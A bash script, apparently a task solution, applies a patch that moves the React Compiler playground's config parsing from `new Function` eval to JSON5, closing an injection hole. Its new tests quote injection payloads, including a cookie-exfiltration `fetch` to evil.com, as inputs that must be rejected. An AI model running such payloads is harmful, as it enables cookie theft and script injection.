#!/usr/bin/env bash
set -euo pipefail

cd /workspace/react

# Idempotent: skip if already applied
if grep -q 'export function parseConfigOverrides' compiler/apps/playground/lib/compilation.ts 2>/dev/null; then
    echo "Patch already applied."
    exit 0
fi

# Use --whitespace=fix if patch has trailing whitespace issues
# IMPORTANT: patch content MUST end with a blank line before the PATCH delimiter
git apply --whitespace=fix - <<'PATCH'
diff --git a/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt b/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
index a012d051ec04..2191397ae126 100644
--- a/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
+++ b/compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
@@ -1,5 +1,3 @@
-import type { PluginOptions } from
-'babel-plugin-react-compiler/dist';
-({
+{
   //compilationMode: "all"
-} satisfies PluginOptions);
\ No newline at end of file
+}
\ No newline at end of file
diff --git a/compiler/apps/playground/__tests__/e2e/page.spec.ts b/compiler/apps/playground/__tests__/e2e/page.spec.ts
index 20596e5d93bf..1a7bf1def137 100644
--- a/compiler/apps/playground/__tests__/e2e/page.spec.ts
+++ b/compiler/apps/playground/__tests__/e2e/page.spec.ts
@@ -237,7 +237,7 @@ test('show internals button toggles correctly', async ({page}) => {
 test('error is displayed when config has syntax error', async ({page}) => {
   const store: Store = {
     source: TEST_SOURCE,
-    config: `compilationMode: `,
+    config: `{ compilationMode: }`,
     showInternals: false,
   };
   const hash = encodeStore(store);
@@ -254,17 +254,17 @@ test('error is displayed when config has syntax error', async ({page}) => {
   const output = text.join('');

   // Remove hidden chars
-  expect(output.replace(/\s+/g, ' ')).toContain('Invalid override format');
+  expect(output.replace(/\s+/g, ' ')).toContain(
+    'Unexpected failure when transforming configs',
   );
 });

 test('error is displayed when config has validation error', async ({page}) => {
   const store: Store = {
     source: TEST_SOURCE,
-    config: `import type { PluginOptions } from 'babel-plugin-react-compiler/dist';
-
-({
+    config: `{
   compilationMode: "123"
-} satisfies PluginOptions);`,
+}`,
     showInternals: false,
   };
   const hash = encodeStore(store);
diff --git a/compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs b/compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs
new file mode 100644
index 000000000000..c48dbf7beb02
--- /dev/null
+++ b/compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs
@@ -0,0 +1,157 @@
+/**
+ * Copyright (c) Meta Platforms, Inc. and affiliates.
+ *
+ * This source code is licensed under the MIT license found in the
+ * LICENSE file in the root directory of this source tree.
+ */
+
+import assert from 'node:assert';
+import {test, describe} from 'node:test';
+import JSON5 from 'json5';
+
+// Re-implement parseConfigOverrides here since the source uses TS imports
+// that can't be directly loaded by Node. This mirrors the logic in
+// compilation.ts exactly.
+function parseConfigOverrides(configOverrides) {
+  const trimmed = configOverrides.trim();
+  if (!trimmed) {
+    return {};
+  }
+  return JSON5.parse(trimmed);
+}
+
+describe('parseConfigOverrides', () => {
+  test('empty string returns empty object', () => {
+    assert.deepStrictEqual(parseConfigOverrides(''), {});
+    assert.deepStrictEqual(parseConfigOverrides('   '), {});
+  });
+
+  test('default config parses correctly', () => {
+    const config = `{
+  //compilationMode: "all"
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {});
+  });
+
+  test('compilationMode "all" parses correctly', () => {
+    const config = `{
+  compilationMode: "all"
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {compilationMode: 'all'});
+  });
+
+  test('config with single-line and block comments parses correctly', () => {
+    const config = `{
+  // This is a single-line comment
+  /* This is a block comment */
+  compilationMode: "all",
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {compilationMode: 'all'});
+  });
+
+  test('config with trailing commas parses correctly', () => {
+    const config = `{
+  compilationMode: "all",
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {compilationMode: 'all'});
+  });
+
+  test('nested environment options parse correctly', () => {
+    const config = `{
+  environment: {
+    validateRefAccessDuringRender: true,
+  },
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {
+      environment: {validateRefAccessDuringRender: true},
+    });
+  });
+
+  test('multiple options parse correctly', () => {
+    const config = `{
+  compilationMode: "all",
+  environment: {
+    validateRefAccessDuringRender: false,
+  },
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {
+      compilationMode: 'all',
+      environment: {validateRefAccessDuringRender: false},
+    });
+  });
+
+  test('rejects malicious IIFE injection', () => {
+    const config = `(function(){ document.title = "hacked"; return {}; })()`;
+    assert.throws(() => parseConfigOverrides(config));
+  });
+
+  test('rejects malicious comma operator injection', () => {
+    const config = `{
+  compilationMode: (alert("xss"), "all")
+}`;
+    assert.throws(() => parseConfigOverrides(config));
+  });
+
+  test('rejects function call in value', () => {
+    const config = `{
+  compilationMode: eval("all")
+}`;
+    assert.throws(() => parseConfigOverrides(config));
+  });
+
+  test('rejects variable references', () => {
+    const config = `{
+  compilationMode: someVar
+}`;
+    assert.throws(() => parseConfigOverrides(config));
+  });
+
+  test('rejects template literals', () => {
+    const config = `{
+  compilationMode: \`all\`
+}`;
+    assert.throws(() => parseConfigOverrides(config));
+  });
+
+  test('rejects constructor calls', () => {
+    const config = `{
+  compilationMode: new String("all")
+}`;
+    assert.throws(() => parseConfigOverrides(config));
+  });
+
+  test('rejects arbitrary JS code', () => {
+    const config = `fetch("https://evil.com?c=" + document.cookie)`;
+    assert.throws(() => parseConfigOverrides(config));
+  });
+
+  test('config with array values parses correctly', () => {
+    const config = `{
+  sources: ["src/a.ts", "src/b.ts"],
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {sources: ['src/a.ts', 'src/b.ts']});
+  });
+
+  test('config with null values parses correctly', () => {
+    const config = `{
+  compilationMode: null,
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {compilationMode: null});
+  });
+
+  test('config with numeric values parses correctly', () => {
+    const config = `{
+  maxLevel: 42,
+}`;
+    const result = parseConfigOverrides(config);
+    assert.deepStrictEqual(result, {maxLevel: 42});
+  });
+});
diff --git a/compiler/apps/playground/components/Editor/ConfigEditor.tsx b/compiler/apps/playground/components/Editor/ConfigEditor.tsx
index e78ff35666b0..f17bec762820 100644
--- a/compiler/apps/playground/components/Editor/ConfigEditor.tsx
+++ b/compiler/apps/playground/components/Editor/ConfigEditor.tsx
@@ -21,9 +21,6 @@ import {monacoConfigOptions} from './monacoOptions';
 import {IconChevron} from '../Icons/IconChevron';
 import {CONFIG_PANEL_TRANSITION} from '../../lib/transitionTypes';

-// @ts-expect-error - webpack asset/source loader handles .d.ts files as strings
-import compilerTypeDefs from 'babel-plugin-react-compiler/dist/index.d.ts';
-
 loader.config({monaco});

 export default function ConfigEditor({
@@ -105,22 +102,10 @@ function ExpandedEditor({
     _: editor.IStandaloneCodeEditor,
     monaco: Monaco,
   ) => void = (_, monaco) => {
-    // Add the babel-plugin-react-compiler type definitions to Monaco
-    monaco.languages.typescript.typescriptDefaults.addExtraLib(
-      //@ts-expect-error - compilerTypeDefs is a string
-      compilerTypeDefs,
-      'file:///node_modules/babel-plugin-react-compiler/dist/index.d.ts',
-    );
-    monaco.languages.typescript.typescriptDefaults.setCompilerOptions({
-      target: monaco.languages.typescript.ScriptTarget.Latest,
-      allowNonTsExtensions: true,
-      moduleResolution: monaco.languages.typescript.ModuleResolutionKind.NodeJs,
-      module: monaco.languages.typescript.ModuleKind.ESNext,
-      noEmit: true,
-      strict: false,
-      esModuleInterop: true,
-      allowSyntheticDefaultImports: true,
-      jsx: monaco.languages.typescript.JsxEmit.React,
+    // Enable comments in JSON for JSON5-style config
+    monaco.languages.json.jsonDefaults.setDiagnosticsOptions({
+      allowComments: true,
+      trailingCommas: 'ignore',
     });
   };

@@ -157,8 +142,8 @@ function ExpandedEditor({
             </div>
             <div className="flex-1 border border-gray-300">
               <MonacoEditor
-                path={'config.ts'}
-                language={'typescript'}
+                path={'config.json5'}
+                language={'json'}
                 value={store.config}
                 onMount={handleMount}
                 onChange={handleChange}
diff --git a/compiler/apps/playground/lib/compilation.ts b/compiler/apps/playground/lib/compilation.ts
index f668c05dde2a..b2bee8bd66d4 100644
--- a/compiler/apps/playground/lib/compilation.ts
+++ b/compiler/apps/playground/lib/compilation.ts
@@ -25,6 +25,7 @@ import BabelPluginReactCompiler, {
   type LoggerEvent,
 } from 'babel-plugin-react-compiler';
 import {transformFromAstSync} from '@babel/core';
+import JSON5 from 'json5';
 import type {
   CompilerOutput,
   CompilerTransformOutput,
@@ -126,6 +127,14 @@ const COMMON_HOOKS: Array<[string, Hook]> = [
   ],
 ];

+export function parseConfigOverrides(configOverrides: string): any {
+  const trimmed = configOverrides.trim();
+  if (!trimmed) {
+    return {};
+  }
+  return JSON5.parse(trimmed);
+}
+
 function parseOptions(
   source: string,
   mode: 'compiler' | 'linter',
@@ -156,16 +165,7 @@ function parseOptions(
   });

   // Parse config overrides from config editor
-  let configOverrideOptions: any = {};
-  const configMatch = configOverrides.match(/^\s*import.*?\n\n\((.*)\)/s);
-  if (configOverrides.trim()) {
-    if (configMatch && configMatch[1]) {
-      const configString = configMatch[1].replace(/satisfies.*$/, '').trim();
-      configOverrideOptions = new Function(`return (${configString})`)();
-    } else {
-      throw new Error('Invalid override format');
-    }
-  }
+  const configOverrideOptions = parseConfigOverrides(configOverrides);

   const opts: PluginOptions = parsePluginOptions({
     ...parsedPragmaOptions,
diff --git a/compiler/apps/playground/lib/defaultStore.ts b/compiler/apps/playground/lib/defaultStore.ts
index 2baada0b8179..9711249ff4f5 100644
--- a/compiler/apps/playground/lib/defaultStore.ts
+++ b/compiler/apps/playground/lib/defaultStore.ts
@@ -14,11 +14,9 @@ export default function MyApp() {
 `;

 export const defaultConfig = `\
-import type { PluginOptions } from 'babel-plugin-react-compiler/dist';
-
-({
+{
   //compilationMode: "all"
-} satisfies PluginOptions);`;
+}`;

 export const defaultStore: Store = {
   source: index,
diff --git a/compiler/apps/playground/package.json b/compiler/apps/playground/package.json
index 217153a219..65f27158d8f2 100644
--- a/compiler/apps/playground/package.json
+++ b/compiler/apps/playground/package.json
@@ -32,6 +32,7 @@
     "hermes-eslint": "^0.25.0",
     "hermes-parser": "^0.25.0",
     "invariant": "^2.2.4",
+    "json5": "^2.2.3",
     "lru-cache": "^11.2.2",
     "lz-string": "^1.5.0",
     "monaco-editor": "^0.52.0",

PATCH

echo "Patch applied successfully."
